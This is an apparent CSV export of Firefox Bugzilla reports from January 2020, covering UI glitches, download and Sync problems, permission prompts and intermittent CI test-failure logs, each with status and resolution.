1608854,"""View Certificate"" button not present when XML is viewed",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Go to https://labs.mgdm.net/test.xml and view the XML file. Click the padlock icon, then the arrow beside ""Connection secure"". Click ""More information"". Actual results: No ""View certificate"" button is visible. Additionally, the technical details section states that the connection is not encrypted, which is incorrect. Expected results: An option to view the certificate should be present. The technical details should indicate that the connection was encrypted."
1608855,"url bar suggesting an url alphabetically, not sorted by most visited",NEW,P5,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: have youtube.com and y2mate.com as bookmarks. Then open new tab, enter ""y Actual results: it will ALWAYS suggest y2mate.com instead of youtube.com, even though I super regularly visit youtube, and barely y2mate.com Expected results: youtube.com should be on top as top suggestion"
1608857,"cannot complete financial company transactions (banks, mutual funds)",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: At USBank I cannot log in (although IE does work). At Vanguard mutual fund, I get a blank screen when I try to start a ""buy"" to transfer money from my bank account to a fund (also, IE does work). THIS BUG APPEARED AFTER THE MOST RECENT UPGRADE TO FIREFOX: 72.0.1 (64-bit). Actual results: I know this is necessarily vague: sorry. You have to have accounts to reproduce. Like, someone there must have a USBank account. Or try your own bank. Expected results: I should have been logged in, or the page should have shown a form."
1608859,Popup Video not having an Icon,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Open the Popup video Player Actual results: 1. The video player opened correctly 2. But have a blank icon in the taskbar preview Expected results: 1. The video popup window should have the firefox icon
1608888,Problem with opening files directly after downloading,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: When I try to download a file (I noticed it first when trying a PDF file, but it fails on all file types) the usual pop-up comes to ask me if I want to save it or open it with some program on my laptop (settings are on 'Always ask' for all file types). Only recently, when I choose the option 'open with ...' and select the program I need, then click OK, another pop-up appears (screenshot added) which doesn't allow me to actually open the file. I have to go into the temporary folder where it is stored to be able to open it. Actual results: Weird second pop-up appeared, I even tried to select the right program there, but that just opens the program to have the program tell me the file isn't readable. Expected results: No second pop-up, just download the file as usual and directly open in in my program of choice, for example Adobe Reader for a PDF file or the standard installed photo editor for a png or jpg file."
1608899,Improve styling of data collection erasure notification box in preferences and adjust addon notification bar font size,NEW,P3,,"STR: 1. Set `ui.systemUsesDarkTheme` to `1` 2. Open about:preferences#privacy 3. Untick the ""Allow Firefox to send technical and interaction data to Mozilla"" checkbox 4. See the notification box AR: 1. The notification box is not suited for in-content dark mode 2. The ""Learn More"" text is not horizontally centered 3. The text size is not the consistent with the very-similar notification box from about:addons"
1608903,Sync option in settings menu grayed out.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Created a sync account, selected Sync Setting, and ""Choose what to synchronize"" options are all grayed out except addresses. Actual results: Created a sync account, selected Sync Setting, and ""Choose what to synchronize"" options are all grayed out except addresses. Expected results: I should have been able to select what was synced."
1608910,Bottom buttons disappear when resizing subdialogs,NEW,P3,,"Reproduced in firefox nightly version 74.0a1 (2020-01-13) (64-bit) in Ubuntu 18.04.3 LTS Build ID 20200113093823 Steps to reproduce: 1- go to about:preferences 2- reach Language and Appearance section 3- click ""choose"" within language option 4- resize window and close it 5- repeat step 3 6- window size is back to original size before step 4 (**attachment: size goes back to original.webm** ) 7- now go to privacy and security section 8- in Cookies and Site Data section, click Manage Data button 9- Rezise the window (only its widtch no the length) 10- close and repeat step 8 11- resize the window to be smaller, and notice that remove selected/all buttons are cut, and cancel and save changes button are no longer visible. ( **attachment resize remains so buttons get corrupted or disappear.webm**) Expected results: ** Buttons should always be visible ** same behaviour should be triggered in every submenu ( there is a max/min size that user can resize, and when resizing window and closing and reopening, size should be the same) Any of these would work Actual results: Buttons are not visible when resizing"
1608930,about:sync-log loads the filename 'about:sync-log' in the parent process with a non-system principal,RESOLVED,P1,FIXED,
1608950,searchbar popup doesn't close after search started (Enter hit) because ui.popup.disable_autohide is still set to true after usage in browser toolbox,RESOLVED,--,DUPLICATE,Firefox 74.0a1 20200113093823 on Windows 8.1 One Nightly profile won't close the search popup belonging to the search bar after one started a search from it. They eBay search engine is missing and also not recognized as missing in Options > Search. Steps to reproduce: 1. Hit Ctrl + K. Searchbar focused. 2. Type something. Search popup opens. 3. Press Enter. Page with search results opened. Expected result: Search popup closed. Actual result: Search popup remains open.
1608966,Intermittent TEST-UNEXPECTED-TIMEOUT | toolkit/components/thumbnails/test/browser_thumbnails_bg_crash_during_capture.js | application timed out after 370 seconds with no output,RESOLVED,P5,INCOMPLETE,"**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284738428&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/YscI_nh_Sp6Y3vYJaLEvfg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-13T21:19:56.978Z] 21:19:56 INFO - TEST-START | toolkit/components/thumbnails/test/browser_thumbnails_bg_crash_during_capture.js [task 2020-01-13T21:19:57.023Z] 21:19:57 INFO - GECKO(5192) | Et tu, Brute? [task 2020-01-13T21:19:57.203Z] 21:19:57 INFO - GECKO(5192) | [Parent 1612, Gecko_IOThread] WARNING: file z:/task_1578938172/build/src/ipc/chromium/src/base/process_util_win.cc, line 160 [task 2020-01-13T21:26:07.602Z] 21:26:07 INFO - Buffered messages logged at 21:19:56 [task 2020-01-13T21:26:07.602Z] 21:26:07 INFO - Entering test bound thumbnails_bg_crash_during_capture [task 2020-01-13T21:26:07.603Z] 21:26:07 INFO - Buffered messages logged at 21:19:57 [task 2020-01-13T21:26:07.603Z] 21:26:07 INFO - TEST-PASS | toolkit/components/thumbnails/test/browser_thumbnails_bg_crash_during_capture.js | Thumbnail should be cached after capture - [task 2020-01-13T21:26:07.603Z] 21:26:07 INFO - Crashin"
1608970,Increase telemetry detail for moz-extension scripts loaded in the parent process,RESOLVED,P1,FIXED,"Per zombie, moz-extension scripts that are loaded in the parent process are unexpected are we should treat them as a security issue. We'd like to collect additional telemetry about when this happens. At this point, we only have the (full) url that is being loaded. From Telemetry we also know what extensions the user has installed. It's not possible (or at least I don't see how) to map an Extension UUID to Extension Name from C++ but if we collect the path and filename that should be enough to figure out which extension it is - especially if we have enough reports for extension overlap. Note that this only applies when the WebExtension process is *enabled*. Presently we know *something* is going on here, we have 3,421 distinct windows clients reporting 33K events on Nightly. We don't know what is causing it, or how many extensions."
1608973,"Blocking of legitimate email hosts from being entered in Sync login screen, pre-populating of illegitimate host instead.",RESOLVED,--,DUPLICATE,"Filing a bug on behalf of a user who is being blocked from using sync. On a clean profile, he is trying to log in with his credential and being blocked by an autofill prompt attached. (I replicated the error by using the fictional email address nonsense@pm.me When I tried to replicate the bug, I see a list of common email hosts suggested once I type a handle and the ""@"" mark. If I hit Continue, I see the red prompt he saw suggesting I correct the mail host to ""gmx.me"" The list of suggestions for my own email address included (gmail, outlook, hotmail, yahoo, qq, web.de, aol, mail.ru, icloud, gmx, t-online, orange, yandex, yahoo.fr, live, 163, msn, comcast, hotmail.co.uk and hotmail.fr suggested as possible auto suggestion fixes. The specific user's problem was that pm.me is a legitimate email host. ( gmx.me is not a legitimate email host, thought gmx.net is, even though it's not his email host.) The specific request of the user is that he not be blocked from entering his legitimate email address when using Proton Mail hosted email addresses, the specific service he uses. A secondary question may be whether we should use auto-suggest in this field for a clean profile at all if the us"
1609010,Intermittent toolkit/components/thumbnails/test/browser_thumbnails_bug818225.js | Uncaught exception - Waiting for http://mochi.test:8888/browser/toolkit/components/thumbnails/test/background_red.html?1578960531540 to exist. - timed out after 50 tries.,RESOLVED,P5,DUPLICATE,"**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284768728&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/KeRkcQEeSr6WW9peYLadqQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-14T00:08:51.540Z] 00:08:51 INFO - TEST-START | toolkit/components/thumbnails/test/browser_thumbnails_bug818225.js [task 2020-01-14T00:09:45.677Z] 00:09:45 INFO - TEST-PASS | toolkit/components/thumbnails/test/browser_thumbnails_bug818225.js | Thumbnail file does not exist - [task 2020-01-14T00:09:45.677Z] 00:09:45 INFO - Console message: [JavaScript Error: ""The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outside the US-ASCII range. The character encoding of the page must be declared in the document or in the transfer protocol."" {file: ""http://mochi.test:8888/browser/toolkit/components/thumbnails/test/background_red.html?1578960531540"" line: 0}] [task 2020-01-14T00:09:45.677Z] 00:09:45 INFO - Buffered messages finished [task 2020-01-14T00:09:45.678Z] 00:09:45 INFO - "
1609021,block images missing,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Ad appeared on right (yahoo mail). The ability to block the image from loading in the ad is not showing. Actual results: Ad appeared on right (yahoo mail). Right clicked and selected ""This Frame"" and then selected ""View Frame Info"". PREVIOUSLY I could click on ""Media"" and then specific images and click a box to HIDE images from that server specifically. Expected results: SHOULD be able to click the box to HIDE the images (not load) from the server or site. This is no longer there, the box is missing. VERY annoying as I use it to block HORROR ads when on IMDB or what I view as inappropriate or intrusive ads on Yahoo (i.e., ads targeted to seniors... I'm 15+ yrs away from that!) I don't know if you purposely took this away or if it's a bug, it LOOKS like it's supposed to be there but isn't with the newest version 72.0.1 but PLEASE put it back if you took it away. I should NOT have to add adblocker plugins when I'm ok with ""most"" ads but want to block images that offend. Please fix this feature."
1609032,Login With Google popup does not expand to maximum window size,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Go to https://www.coursehero.com/login/ 2. Click on ""Login with Google"" I don't think this issue happens all the time. I am able to reproduce it with the link above. Actual results: A popup will appear, but the content does not expand to its maximum size. See the attached image of the popup window. Expected results: The popup content is shown correctly. See attached image of the popup window."
1609034,Device registration not updated when user's password is reset,NEW,P2,,"The device registration includes the encryption key for the URL etc. If a user resets their password, this key should be updated - but best I can tell, the device is not re-registered in this case. In theory, no registration change should be necessary for a *change*, only for a reset, but we should verify that. Our [existing mechanism](https://searchfox.org/mozilla-central/rev/9e45d74b956be046e5021a746b0c8912f1c27318/services/fxaccounts/FxAccountsDevice.jsm#176) for detecting whether a device re-registration is needed also doesn't really handle this case - it will say no registration is needed even if the key contents have changed. We probably need to arrange to unconditionally re-register in this case. Bug 1296328 was filed a few years ago, and will typically handle the case where the password was changed/reset on *this* device, but doesn't handle it on subsequent devices. It's possible we should revert that if the mechanism we end up with handles that case too. Found this via bug 1601446, which isn't going to fix this - although it might help - it re-registers on verification, so we probably need to ensure some observer is notified in all these cases - ON_ACCOUNT_STATE_CHANGE_NOT"
1609060,A PDF file will not open in Firefox PDF Viewer and causes opening MANY tabs!!,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: https://support.mozilla.org/en-US/kb/firefox-repeatedly-opens-empty-tabs-or-windows I have Firefox set as the default PDF viewer on my computer. This bug causes multiple tabs to open because Firefox will not open the PDF file. I tried to view this file in the Firefox PDF viewer: http://dl.eve-files.com/media/corp/Laci/ISK_Vol_2_Rubicon_1_3_2_ENG_TEASER.pdf However... Firefox will not view that file and instead tries to get me to save it locally, which I did. Then I pressed ALT to get to the FIle menu and then selected that file. When I attempted to open it, I got a dialog where I told Firefox to default to opening PDF files. After I did this, multiple tabs started opening in a loop. Actual results: multiple tabs started opening in a loop and Firefox will not open or display that PDF file. Expected results: Firefox should have opened and displayed the PDF file."
1609160,"The ""Firefox"" name and logo are wrongly displayed above the in-content ""Search Bar"" even if the ""Highlights"" section is still enabled",VERIFIED,P1,FIXED,"**[Affected versions]:** - Firefox Release 72.0.1 - Build ID: 20200107212822 - Firefox Beta 73.0b4 - Build ID: 20200112220634 - Firefox Nightly 74.0a1 - Build ID: 20200114094410 **[Affected Platforms]:** - Windows 10 x64 - Mac 10.15.2 - Ubuntu 18.04 x64 **[Prerequisites]:** - Have a Firefox profile with the ""browser.search.region"" pref set to ""US"" in the ""about:config"" page. **[Steps to reproduce]:** 1. Open the browser with the profile from prerequisites. 2. Navigate to the ""about:preferences#home"" page. 3. Uncheck the ""Top Sites"" and ""Recommended by Pocket"" options. 4. Open a new tab and observe the displayed elements. **[Expected result]:** - Only the in-content ""Search Bar"" and the ""Highlights"" section are displayed. **[Actual result]:** - The ""Firefox"" name and logo are also displayed above the in-content ""Search Bar"". **[Regression Window]:** - Considering the fact that this issue is not reproducible on older Firefox versions, using the Mozregression tool, we have managed to find the following pushlog: Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=8e8ea33ecb3da138dbd0af56c2e5550902e7b05a&tochange=777492b75f9745bd78dc96155ccd91523b788db0 From the "
1609166,"Firefox Sync login does not become verified, despite entering correct verification code",RESOLVED,P1,FIXED,"STEPS TO REPRODUCE 1. In a fresh profile from the toolbar menu, select Sign in to Firefox (Turn on Sync) 2. Create a new account but do not verify 3. Notice that browser enters ""verification required"" state 4. Enter verification code EXPECTED RESULTS * Sync becomes verified and starts working ACTUAL RESULTS * Remains in ""verification required"" state until user selects ""Resend Verification"" in sync prefs"
1609225,Get browser.cache.disk.parent_directory working,RESOLVED,P3,WORKSFORME,We added this via policy but it's not working. It's set too late. It works for users because it's set as a user pref so it just gets read on the next reboot.
1609238,"canvas.transferControlToOffscreen() throws ""NS_ERROR_NOT_IMPLEMENTED"" Exception",RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Linux i686; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: 1. about:config set gfx.offscreencanvas.enabled 2. Execute canvas.transferControlToOffscreen() Actual results: Throws NS_ERROR_NOT_IMPLEMENTED Exception Expected results: NS_ERROR_NOT_IMPLEMENTED Exception should not be thrown -- Appears to be a regression from https://bugzilla.mozilla.org/show_bug.cgi?id=1598998 ? We do not get to NS_ERROR_FAILURE at canvas.width = 1000 described at https://bugzilla.mozilla.org/show_bug.cgi?id=1389090 before the NS_ERROR_NOT_IMPLEMENTED Exception is thrown. Components: - Canvas: WebGL - Canvas: 2D
1609287,about:protections private browsing message is not dark theme friendly,VERIFIED,P2,FIXED,https://searchfox.org/mozilla-central/rev/9b4b41b95cbcda63f565bdc24411e15248f91d83/browser/components/protections/content/protections.css#262-270 These hardcoded colors should be replaced with variables from common.css.
1609309,Intermittent TEST-UNEXPECTED-TIMEOUT | browser/base/content/test/tabcrashed/browser_showForm.js | application timed out after 370 seconds with no output,RESOLVED,P5,INCOMPLETE,"**Filed by:** cbrindusan [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284948732&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/UzxPHKFvRDyAzkjkzeR1sw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-15T00:21:18.672Z] 00:21:18 INFO - TEST-START | browser/base/content/test/tabcrashed/browser_showForm.js [task 2020-01-15T00:21:19.028Z] 00:21:19 INFO - GECKO(216) | Et tu, Brute? [task 2020-01-15T00:21:19.388Z] 00:21:19 INFO - GECKO(216) | [Parent 1756, Gecko_IOThread] WARNING: file z:/task_1579042188/build/src/ipc/chromium/src/base/process_util_win.cc, line 160 [task 2020-01-15T00:21:19.408Z] 00:21:19 INFO - GECKO(216) | about:tabcrashed loaded and ready [task 2020-01-15T00:27:29.432Z] 00:27:29 INFO - Buffered messages logged at 00:21:18 [task 2020-01-15T00:27:29.432Z] 00:27:29 INFO - Entering test bound test_show_form [task 2020-01-15T00:27:29.433Z] 00:27:29 INFO - Console message: [JavaScript Error: ""The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outsi"
1609321,URL autofill sometimes flickers when typing the wrong case,NEW,P3,,"1. Type ""bugzilla.mozilla.org/s"" to autofill a URL like bugzilla.mozilla.org/show_bug.cgi?id=123456 2. Press backspace to delete the selected part 3. Press backspace again to delete the ""s"" 4. Type an uppercase ""S"" and then start typing the rest of ""how_bug"". The case doesn't matter for the ""how_bug"" part. Most of the time you try this, the rest of the ""how_bug"" etc. part -- which is selected -- flickers and then disappears. Step 1 seems to be necessary. I'm guessing that it's autofilling the placeholder, and then when the search is done, it's correctly removing the autofilled part because it doesn't actually match due to the difference in case. So I would guess that the placeholder logic is incorrectly doing a case-insensitive comparison, but I haven't debugged this yet."
1609328,"Intermittent browser/components/sessionstore/test/browser_upgrade_backup.js | expected number of backups are present after removing old backups - Got 6, expected 3",RESOLVED,P5,INCOMPLETE,"**Filed by:** nbeleuzu [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284977761&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/ChNkSucjTsOhHOoA-LZ_7g/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-15T04:52:22.673Z] 04:52:22 INFO - TEST-PASS | browser/components/sessionstore/test/browser_upgrade_backup.js | upgrade backup file has been created - [task 2020-01-15T04:52:22.674Z] 04:52:22 INFO - Buffered messages finished [task 2020-01-15T04:52:22.675Z] 04:52:22 INFO - TEST-UNEXPECTED-FAIL | browser/components/sessionstore/test/browser_upgrade_backup.js | expected number of backups are present after removing old backups - Got 6, expected 3 [task 2020-01-15T04:52:22.675Z] 04:52:22 INFO - Stack trace: [task 2020-01-15T04:52:22.676Z] 04:52:22 INFO - chrome://mochikit/content/browser-test.js:test_is:1320 [task 2020-01-15T04:52:22.677Z] 04:52:22 INFO - chrome://mochitests/content/browser/browser/components/sessionstore/test/browser_upgrade_backup.js:test_upgrade_backup_removal:174 [task 2020-01-15T04:52:22.677Z] 04:52:22 INFO - chrome://mochikit/content/browser-test.js:Tester_execTest/<"
1609342,Intermittent browser/components/sessionstore/test/browser_tab_label_during_restore.js | title bar displays content title -,RESOLVED,P5,INCOMPLETE,"**Filed by:** csabou [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284988355&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/fSsF6ob0RPKc2Xfu9HKRzg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-15T05:48:49.013Z] 05:48:49 INFO - TEST-PASS | browser/components/sessionstore/test/browser_tab_label_during_restore.js | observed tab label changes - [task 2020-01-15T05:48:49.013Z] 05:48:49 INFO - selecting the third tab [task 2020-01-15T05:48:49.014Z] 05:48:49 INFO - Console message: SessionStore: [process-switch]: currentRemoteType (webIsolated=http://example.com) preferredRemoteType: webIsolated=http://example.com [task 2020-01-15T05:48:49.014Z] 05:48:49 INFO - Console message: SessionStore: [process-switch]: webIsolated=http://example.com, webIsolated=http://example.com, false [task 2020-01-15T05:48:49.014Z] 05:48:49 INFO - Console message: SessionStore: [process-switch]: type (webIsolated=http://example.com) is compatible - ignoring [task 2020-01-15T05:48:49.014Z] 05:48:49 INFO - TEST-PASS | browser/components/sessionstore/test/browser_tab_label_during_restore.js | third tab isn't"
1609398,Library button is briefly shown when under Overflow Menu due to small Firefox Window while bookmarking a page and maximize/minimize the browser,RESOLVED,--,DUPLICATE,*Affected versions* * 74.0a1 (20200114214307) * 73.0b5 (20200115020958) * 72.0.1 (20200107212822) *Affected platforms* * Windows 10x64 * Ubuntu 16.04 * macOS 10.15 *Steps to reproduce* 1. Open Firefox and make the browser window smaller (until the Library button enters the overflow menu). 2. Bookmark a random webpage and maximize/minimize the window by double-clicking on the tab bar. *Expected result* * No glitches presented when minimizing/maximizing the browser. *Actual result* * The library button is briefly displayed on the address bar. *Regression Range* * I will search for one ASAP if there is one. *Notes* * Attached a screen recording. * This bug was opened on request after was discussed on bug 1607160 [comment 6](https://bugzilla.mozilla.org/show_bug.cgi?id=1607160#c6) and [comment 7](https://bugzilla.mozilla.org/show_bug.cgi?id=1607160#c7).
1609404,Intermittent browser/components/sessionstore/test/browser_cookies_legacy.js | Test timed out -,RESOLVED,P5,INCOMPLETE,**Filed by:** btara [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285015539&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/RlPvdPBVQwuYDsr7bOWgAg/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-15T11:19:56.887Z] 11:19:56 INFO - TEST-START | browser/components/sessionstore/test/browser_cookies_legacy.js [task 2020-01-15T11:19:56.897Z] 11:19:56 INFO - GECKO(2952) | [Parent 4768: Main Thread]: I/DocShellAndDOMWindowLeak ++DOCSHELL 000001F0CEA37000 == 38 [pid = 4768] [id = {0728d1bd-5c54-4b5b-afa1-acc65d351e48}] [task 2020-01-15T11:19:56.897Z] 11:19:56 INFO - GECKO(2952) | [Parent 4768: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 102 (000001F0CDDD23E0) [pid = 4768] [serial = 655] [outer = 0000000000000000] [task 2020-01-15T11:19:56.897Z] 11:19:56 INFO - GECKO(2952) | [Parent 4768: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 103 (000001F0EAE8D800) [pid = 4768] [serial = 656] [outer = 000001F0CDDD23E0] [task 2020-01-15T11:19:57.084Z] 11:19:57 INFO - GECKO(2952) | [Parent 4768: Main Thread]: I/DocShellAndDOMWindowLeak ++DOCSHELL 000001F0E0AD6800 == 39 [pid = 4768] [id
1609466,[Windows] Download dialog for application/zip (and any other mimetypes not listed in the registry) doesn't offer to open with the default application anymore,VERIFIED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I set ""Always ask"" for all types of downloaded files. When I click a link to download a ZIP file, the download dialog show the Browse button instead of the drop-down menu. This does not happen in the previous version of Firefox 71. Actual results: 1) The Browser button is show for the following MIME type: application/zip. 2) The drop-down menu is shown only for the following MIME type: application/x-zip-compressed. See attached Image-1.jpg"
1609492,nightly 74.0a1 crashes repeatedly in Hacl_Chacha20Poly1305_128_aead_decrypt:1235,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Upon the initial crash I merely did a restart of firefox with the nightly crash report widget still on the screen. This results in another crash immediately. I took note that the crash seems to happen with attempt to access the wikipedia site. https://crash-stats.mozilla.org/report/index/9fe9e608-81e5-4a2b-b72d-5f2a70200115 I closed some of the tabs upon restart from this crash and when I tried to access the wikipedia site again I got the crash : https://crash-stats.mozilla.org/report/index/3a7d3063-77f6-4132-a37a-13a080200115 At this point I did a restart and flushed out history and all tabs and also disabled javascript from the about:config page with javascript.disabled. When I tried to access the wikipedia site we see another repeatable crash : https://crash-stats.mozilla.org/report/index/bf97e6bb-795d-4738-afc3-5fd100200115 Finally I tried one last time to merely access wikipedia.org and again a crash and always in the same place : https://crash-stats.mozilla.org/report/index/ae58eb14-4cf7-417a-9fe8-c12bb0200115 Looks like security/nss/lib/freebl/verified/Hacl_Chacha20Poly1305_1
1609499,Library button drop down menu displays small window and in the wrong position,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Click on the library menu. Actual results: Menu doesn't display fully or in the proper position. Expected results: Full menu should appear under the appropriate menu (library) button.
1609502,Video has lag / shuttering,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: After a fresh install of windows 10 the Video on YouTube when FullScreen has lag. Like the person on the video is teleporting 10 frames but without to say i have dropped frames. Actual results: I can't reproduce on version 71 ... Expected results: Why :((
1609530,"Focused input in devtools add-on panel is unable to type ""'"" or ""/""",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: 1. Create a devtools add-on panel with an input field 2. Attempt to type ' or / into the field My guess is this is related to the Accessibility.typeahead feature because when this feature is disabled, I am able to successfully type those values into an input inside of a devtools add-on panel. Attached is an example extension to reproduce the issue. Actual results: Unable to type ' or / into focused input field Expected results: Able to type ' or / into focused input field"
1609534,"When the address manager subdialog is scrollable, it overlaps the scrollbar for the <select> element",NEW,P3,,"STR: 1. Navigate to ""about:preferences"" 2. Search for ""addresses"" 3. Click the button that reads ""Saved Addresses..."" 4. Add addresses so that there are at least 8 total. 5. Observe that there is now a scroll bar on the <select> element that displays the addresses. 6. Close the address manager subdialog. 7. Resize the Firefox window so that it is quite small 8. Click ""Saved Addresses..."" again Expected Results: Both the scrollbar for the dialog and the scrollbar for the <select> element should be visible Actual Results: The scrollbar for the <select> element is not visible because it is hidden under the scrollbar for the dialog. There isn't even a horizontal scrollbar we could use to bring it into frame. A couple of notes about this: - I discovered this while fixing Bug 1608246, which was preventing the subdialog from being shown at all when the Firefox window was too small. You may need to wait for that patch to merge to be able to reproduce this. I did, however, double check with a build from before Bug 1608246 was introduced to verify that this bug was preexisting behavior rather than something I caused. - I discovered this on Windows. I know that macOS scrollbars are, by defaul"
1609551,UI/Accessibility Barrier: Forms in add-on dropdowns impossible to fill with on screen keyboard on desktop Linux,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.118 Safari/537.36 Steps to reproduce: I rely on the Onboard onscreen keyboard for typing on Linux. I open a Firefox addon dropdown with a form field (Bitwarden's login screen or renaming a container tab group in Mozilla's Firefox Multi-Account Containers extension). I click on the form field to give it focus. I attempted to type using Onboard as usual. Actual results: When clicking on a letter on the keyboard, the extension loses focus and closes. As a result, these forms are impossible for me to fill. As a result, I cannot log in to my password manager. This is likely because the dropdown loses focus too easily. Expected results: The onscreen keyboard should be able to type in these fields."
1609572,userChrome.css and userContent.css don't work on New Tab page,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Visited the New Tab page. Since certain objects animate on mouseover, tried to use userChrome.css to block this. Also tried userContent.css. Neither worked. Actual results: There is no domain, so I can't use that to limit the css to this page. I tried to use the object names, as follows: /* Remove new tab page animation */ .top-site-outer { transition: none !important; animation-duration: 0s !important; transition:unset !important; } More aggressively, to see if this is doing anything with the css: /* Remove new tab page animation */ .top-site-outer { display: none !important transition: none !important; animation-duration: 0s !important; transition:unset !important; } Also tried: /* Remove new tab page animation */ #main-window[title^=""New Tab""] transition: none !important; animation-duration: 0s !important; transition:unset !important; } Nothing happened. Expected results: The New Tab page should follow user css, at least for accessibility fixes."
1609578,"Users shouldn't have to ""Block"" future permissions to back out of *changing* camera or mic",RESOLVED,P2,FIXED,"A page may call `getUserMedia` many times requesting different devices. Hitting ""Deny"" on _any_ of these prompts temporarily blocks all further gUM permissions on that page. That seems overly severe. A common use flow is in-content device selection where a user switches camera or microphone: **STR (requires 2 cameras, or use a phone):** (Remove persistent permissions first): 1. Open https://whereby.com/room12345 and ""Request permission"" 2. Hit ""Allow"" in Firefox's gUM prompt 3. (You realize you wanted to use a different camera and) click the ⚙️ gear icon to change to the other camera (or flip ↻ front/back on phone) 4. Pick your other camera. A Firefox gUM prompt for that device appears. 5. (You change your mind and) hit ""Deny"" in this second gUM prompt **Expected result:** * The first camera is still chosen and working, and repeating steps 4-5 works (at least on a third camera). **Actual result:** * ""Cam and mic are blocked"" & the user is stuck until they refresh the page (see image). **Side-bug:** * As the image shows, the page-info drop-down has icons showing permission is blocked, but the text still says ""Allowed Temporarily"". The text appears to be a refresh bug, as the permiss"
1609583,"Intermittent browser/components/protections/test/browser/browser_protections_report_ui.js | today has all of the data types shown - 0 == 5 - got 0, expected 5 (operator ==)",RESOLVED,P5,INCOMPLETE,"**Filed by:** dvarga [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=285116252&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/IOuiw5O9RCex2bqiTddNjQ/runs/0/artifacts/public/logs/live_backing.log --- ``` [task 2020-01-16T00:00:01.191Z] 00:00:01 INFO - TEST-PASS | browser/components/protections/test/browser/browser_protections_report_ui.js | Table has an accessible label - ""graphLegendDescription"" == ""graphLegendDescription"" - [task 2020-01-16T00:00:01.191Z] 00:00:01 INFO - Buffered messages finished [task 2020-01-16T00:00:01.193Z] 00:00:01 INFO - TEST-UNEXPECTED-FAIL | browser/components/protections/test/browser/browser_protections_report_ui.js | today has all of the data types shown - 0 == 5 - got 0, expected 5 (operator ==) [task 2020-01-16T00:00:01.193Z] 00:00:01 INFO - Stack trace: [task 2020-01-16T00:00:01.193Z] 00:00:01 INFO - 